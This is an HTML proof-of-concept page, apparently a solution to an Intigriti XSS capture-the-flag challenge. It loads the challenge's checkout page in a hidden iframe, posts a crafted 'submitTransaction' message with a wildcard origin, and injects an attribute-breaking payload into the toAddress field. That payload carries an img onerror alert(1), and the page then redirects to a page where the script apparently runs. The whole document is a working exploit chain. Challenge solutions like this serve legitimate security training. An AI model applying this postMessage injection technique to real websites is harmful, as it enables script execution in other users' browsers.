<!DOCTYPE html>
<body>
<script>
// Test XSS with alert(1) first
const xss = `<img src=x onerror=alert(1)>`;

const f = document.createElement('iframe');
f.style.display = 'none';
f.src = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';

f.onload = () => {
    setTimeout(() => {
        f.contentWindow.postMessage({
            type: 'submitTransaction',
            transaction: { toAddress: `" onmouseover="${xss}" x="`, currency: '1337COIN', amount: 1 }
        }, '*');
        setTimeout(() => window.location = 'https://challenge-0126.intigriti.io/marketwatch.html', 2000);
    }, 2000);
};
document.body.appendChild(f);
</script>
</body>
</html>
